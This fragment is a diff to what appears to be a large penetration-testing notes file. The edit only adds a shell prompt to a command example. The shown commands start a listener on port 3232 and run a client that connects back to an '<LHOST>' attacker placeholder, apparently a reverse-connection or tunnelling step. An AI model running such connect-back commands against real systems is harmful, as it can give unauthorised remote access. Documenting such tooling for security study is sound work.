@@ -4517,7 +4517,7 @@ $ ./server 0.0.0.0:3232
 ```
 
 ```c
-./client -d <LHOST>:3232
+$ ./client -d <LHOST>:3232
 ```
 
 ```c
